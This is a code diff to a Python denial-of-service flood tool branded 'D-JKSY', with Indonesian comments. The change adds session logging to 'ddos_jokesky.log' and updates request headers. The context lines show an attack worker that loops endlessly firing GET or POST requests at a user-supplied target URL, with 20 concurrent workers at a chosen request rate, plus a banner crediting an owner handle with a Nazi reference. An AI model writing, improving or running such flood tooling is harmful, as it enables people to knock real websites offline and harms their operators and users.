@@ -6,6 +6,18 @@ from rich.panel import Panel
 console = Console()
 stats = {"total": 0, "success": 0, "failed": 0, "latency": 0}
 
+def write_log(target, mode, total, success, failed):
+    # Fungsi untuk mencatat hasil ke ddos_jokesky.log
+    with open("ddos_jokesky.log", "a") as f:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        f.write(f"[{timestamp}] SESSION FINISHED\n")
+        f.write(f"Target  : {target}\n")
+        f.write(f"Mode    : {mode}\n")
+        f.write(f"Total   : {total}\n")
+        f.write(f"Success : {success}\n")
+        f.write(f"Failed  : {failed}\n")
+        f.write("-" * 40 + "\n")
+
 def show_manual():
     console.print("[bold red]>>> D-JKSY ELITE AUTHORITY ACTIVE <<<[/]", justify="center")
     manual = """
@@ -32,9 +44,9 @@ async def attack_worker(url, mode, rps_limit):
         while True:
             t1 = time.perf_counter()
             try:
-                headers = {"User-Agent": f"D-JKSY-V9/{time.time()}"}
+                headers = {"User-Agent": f"D-JKSY-V9.3-PRO/{time.time()}"}
                 if mode.upper() == "POST":
-                    req = session.post(url, headers=headers, data={"jksy": "v9"})
+                    req = session.post(url, headers=headers, data={"jksy": "finish"})
                 else:
                     req = session.get(url, headers=headers)
                 async with req as resp:
@@ -50,8 +62,6 @@ async def attack_worker(url, mode, rps_limit):
 async def monitor(target, mode, duration):
     start_time = time.time()
     last_total = 0
-    
-    # Header Control Center
     os.system('cls' if os.name == 'nt' else 'clear')
     control_panel = f"""╭────────────────────────────── D-JKSY CONTROL CENTER ──────────────────────────────╮
 │ OWNER  : JOKESKYLS (@nazisme1930)                                                 │
@@ -68,12 +78,8 @@ async def monitor(target, mode, duration):
         current_total = stats["total"]
         rps = current_total - last_total
         last_total = current_total
-        
         now = datetime.now().strftime("%H:%M:%S")
-        latency = f"{stats['latency']:.0f}ms"
-        
-        # Format baris data agar sejajar sesuai kolom
-        log_line = f"{now:<12} {rps:<11} {latency:<13} {stats['success']:<15} {stats['failed']}"
+        log_line = f"{now:<12} {rps:<11} {stats['latency']:.0f}ms{'' : <10} {stats['success']:<15} {stats['failed']}"
         console.print(log_line)
 
 async def main():
@@ -100,7 +106,6 @@ async def main():
     rps_val  = int(console.input("[bold white] Target RPS      : [/]"))
     duration = int(console.input("[bold white] Duration (sec)  : [/]"))
 
-    # Menjalankan Attack dan Monitor secara bersamaan
     workers = [attack_worker(target, mode, rps_val) for _ in range(20)]
     monitor_task = asyncio.create_task(monitor(target, mode, duration))
     
@@ -109,7 +114,11 @@ async def main():
     except asyncio.TimeoutError:
         pass
     
-    console.print(f"\n[bold green]FINISH[/] | Total Reqs: {stats['total']} | Owner: @nazisme1930")
+    # Mencatat hasil ke file log
+    write_log(target, mode, stats['total'], stats['success'], stats['failed'])
+    
+    console.print(f"\n[bold green]FINISH[/] | Stats saved to [bold white]ddos_jokesky.log[/]")
+    console.print(f"[bold white]Total Reqs: {stats['total']} | Success: {stats['success']} | Failed: {stats['failed']}[/]")
 
 if __name__ == "__main__":
     asyncio.run(main())
